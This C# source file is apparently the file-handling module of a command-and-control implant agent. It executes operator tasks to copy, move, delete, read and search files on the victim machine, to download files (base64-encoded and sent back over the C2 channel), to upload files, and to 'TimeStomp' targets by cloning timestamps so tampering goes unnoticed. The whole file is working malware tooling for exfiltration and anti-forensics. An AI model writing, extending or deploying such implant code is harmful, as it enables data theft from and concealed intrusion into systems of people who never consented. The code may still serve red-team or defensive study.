using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Agent.Modules
{
    public class FileModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "File",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Copy",
                        Delegate = CopyFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Move",
                        Delegate = MoveFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Delete",
                        Delegate = DeleteFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Read",
                        Delegate = ReadFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Download",
                        Delegate = DownloadFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Upload",
                        Delegate = UploadFile
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Search",
                        Delegate = SearchFiles
                    },
                    new ModuleInfo.Command
                    {
                        Name = "TimeStomp",
                        Delegate = TimeStompFile
                    }
                }
            };
        }

        void CopyFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
                var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;

                File.Copy(source, destination, true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void MoveFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
                var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;

                File.Move(source, destination);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void DeleteFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;

                File.Delete(path);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ReadFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;

                var text = File.ReadAllText(path);
                Agent.SendMessage(text);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void DownloadFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;

                var file = Convert.ToBase64String(File.ReadAllBytes(path));
                Agent.SendMessage(file);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void UploadFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
                var source = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value);
                var destination = (string)parameters.FirstOrDefault(p => p.Name.Equals("Destination", StringComparison.OrdinalIgnoreCase)).Value;

                File.WriteAllBytes(destination, source);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SearchFiles(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var path = (string)parameters.FirstOrDefault(p => p.Name.Equals("Path", StringComparison.OrdinalIgnoreCase)).Value;
                var pattern = (string)parameters.FirstOrDefault(p => p.Name.Equals("Pattern", StringComparison.OrdinalIgnoreCase)).Value;

                var files = Directory.GetFiles(path, pattern, SearchOption.AllDirectories);
                var result = string.Join("\n", files);

                Agent.SendMessage(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void TimeStompFile(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;

                var source = (string)parameters.FirstOrDefault(p => p.Name.Equals("Source", StringComparison.OrdinalIgnoreCase)).Value;
                var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;

                var info = new FileInfo(source);

                File.SetCreationTime(target, info.CreationTime);
                File.SetCreationTimeUtc(target, info.CreationTimeUtc);

                File.SetLastWriteTime(target, info.LastWriteTime);
                File.SetLastWriteTimeUtc(target, info.LastWriteTimeUtc);

                File.SetLastAccessTime(target, info.LastAccessTime);
                File.SetLastAccessTimeUtc(target, info.LastAccessTimeUtc);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}